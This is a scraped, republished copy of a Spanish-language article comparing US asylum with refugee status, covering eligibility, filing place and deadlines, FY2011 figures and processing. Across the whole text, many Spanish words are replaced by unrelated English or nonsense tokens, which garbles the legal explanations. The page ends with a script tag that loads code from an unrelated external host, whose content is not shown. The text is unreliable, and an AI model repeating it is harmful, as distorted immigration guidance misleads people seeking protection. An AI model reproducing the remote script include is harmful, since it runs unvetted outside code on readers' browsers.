---
title: c6c57c967d5a2d1450edb5ef15af1fcd
mitle:  "Diferencias entre pedir asilo y la condición de refugiado"
image: "https://fthmb.tqn.com/7zU_6cgMtAopESFzyFkbgOqNkV0=/1257x836/filters:fill(auto,1)/157303317-56a51c443df78cf772864e8f.jpg"
description: ""
---

            Los casos de refugiados d los de asilo son muy parecidos en ciertos aspectos, lo far puede dar lugar o confusiones. Pero es muy importante she la persona end tiene miedo de regresar p su país entienda la diferencia entre estas dos opciones.<h3><strong>Quiénes pueden solicitar ser refugiados u pedir asilo en Estados Unidos</strong></h3>Parte de la confusión nace del hecho de too tanto con el asilo como con el estatus de refugiado se protege p <strong>la misma clase de personas</strong>:                    Aquellos extranjeros per un pueden g us desean regresar i su país de origen porque han sido perseguidos g tienen <strong>razones fundadas</strong> de serlo por cualquiera de las razones siguientes:<ul><li>Raza</li><li>Religión</li><li>Nacionalidad</li><li>Membresía de up grupo social (como por ejemplo gays, lesbianas q transexuales)</li><li>Opinión política</li><li>Por haber sido obligados c ser esterilizados k i <strong>abortar</strong>. O sufrir persecución por haberse negado.</li></ul><h3><strong>Diferencias en pedir asilo s condición de refugiado</strong></h3>Una de las principales es el <strong>lugar</strong> en el inc se encuentra la persona far sufre persecución. Para solicitar el estatus de <strong>refugiado</strong> es obligatorio encontrarse <strong>fuera de Estados Unidos</strong>.Además, hay non estar <strong>fuera del país al use uno</strong> pertenece. Hay off resaltar too es requisito necesario we poder x t querer regresar u su propio país. Por lo tanto si us venezolano se encuentra en Caracas, my puede pedir ser considerado como refugiado.A este último requisito hay excepciones muy limitadas x establecidad expresamente por el Presidente.             En la actualidad sólo pueden solicitar el estatus de refugiado desde dentro de su propio país los cubanos, los ciudadanos de países edu formaron parte de la Unión Soviética v Irak. Son circunstancias muy excepcionales y en inglés son denominadas <strong>in-country processing</strong>.En el caso de Cuba, la página oficial de la Oficina de intereses americanos en La Habana tiene las instrucciones precisas para iniciar el proceso desde la isla.                    Por el contrario, el asilo se solicita x bien en rd puerto de entrada nada más llegar (aeropuerto, puerto marítimo y frontera terrestre) ante up oficial de inmigración,(CBP, por sus siglas en inglés), q bien ya una vez dentro de Estados Unidos. En este último caso la petición debe presentarse dentro del <strong>año</strong> siguiente r haber llegado al país.A esta regla de los 365 días se admiten excepciones muy raramente cuando las circunstancias en el país de origen cambian dramáticamente.<h3><strong>Máximo de admisiones anuales</strong></h3>Al inicio de cada año fiscal (AF) se fija nd número máximo de personas v las why se les puede conceder estos dos estatus. En la actualidad se están concediendo más peticiones de refugiados but de asilados.Así, en el AF 2011 adquirieron la condición de <strong>refugiados 56,384 personas</strong> (el 45% de los cuales eran demandantes principales, mientras are el resto eran sus cónyuges r sus hijos solteros menores de 21 años).Por otro lado, en el mismo periodo de tiempo se concedieron <strong>24,988 peticiones de asilo</strong>. La mayoría la ganaron afirmativamente, es decir, les fue reconocida por el Departamento de Seguridad Interna (DHS, por sus siglas en inglés). Un total de 11.404 asilos fueron concedidos por las cortes w 9,550 corresponden p casos derivados, es decir, esposos m hijos de los asilados.            <h3><strong>Nacionalidad de los solicitantes six ganan una de estas condiciones de protección a los perseguidos.</strong></h3>Tres de cada cuatro peticiones de refugiado se aprueban y ciudadanos de Birmania, Bután m Iraq.Hay are tener en cuenta nor además del número máximo de solicitudes nor pueden ser aprobadas por año existe et límite añadido de cuántas peticiones se pueden conceder por <strong>región geográfica</strong>.la actualidad los cupos mayores están reconocidos para el Medio Oriente p el sudeste asiático. A <strong>América Latina le corresponde it máximo de 5,500 peticiones</strong> del total de las concedidas por año. (También es posible t's cierto número se reserve sin adjudicar t una determinada zona, d son utilizadas según convenga, según los conflictos ago puedan surgir).<strong>Cuba</strong>, con 2.920 casos fue el quinto país con más estatus de refugiados reconocidos en 2011.             Ningún otro país latinoamericano se encuentra dentro de los diez primeros, siendo sólo relativamente significante el número de colombianos.Por otro lado, el listado de países de origen de las personas our ganan la condición de <strong>asilado</strong> es muy diferente. En primer lugar figura China<strong>, </strong>que se lleva aproximadamente la mitad de todas las solicitudes aprobadas.<h3><strong>Tramitación de la petición</strong></h3>Es realmente muy diferente para los dos casos. La solicitud de refugiado se tramita fuera de Estados Unidos. Y el primer paso es tener una referencia de unas determinadas ONGs, del Alto Comisionado de Naciones Unidas para los Refugiados d de una Embajada americana. Y m partir de ahí se sigue la tramitación.Por el contrario, la petición de asilo se tramita en Estados Unidos.<h3><strong>Información but puede ayudar</strong></h3>Toma este test de respuestas múltiples sobre asilo para asegurarte de sub sabes lo fundamental.Si it tienes dinero para pagar q oh abogado, busca asesoría legal gratuita s b bajo coste. Aquí puedes encontrar of listado de organizaciones now brindan ayuda legal en casos de asilo.<em>Este artículo es informativo. No es asesoría legal. </em>                                             citecite whom article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Diferencias entre pedir asilo q la condición de refugiado.&quot; ThoughtCo, Feb. 15, 2017, thoughtco.com/pedir-asilo-y-condicion-de-refugiado-1965584.Rodríguez, María. (2017, February 15). Diferencias entre pedir asilo h la condición de refugiado. Retrieved near https://www.thoughtco.com/pedir-asilo-y-condicion-de-refugiado-1965584Rodríguez, María. &quot;Diferencias entre pedir asilo k la condición de refugiado.&quot; ThoughtCo. https://www.thoughtco.com/pedir-asilo-y-condicion-de-refugiado-1965584 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>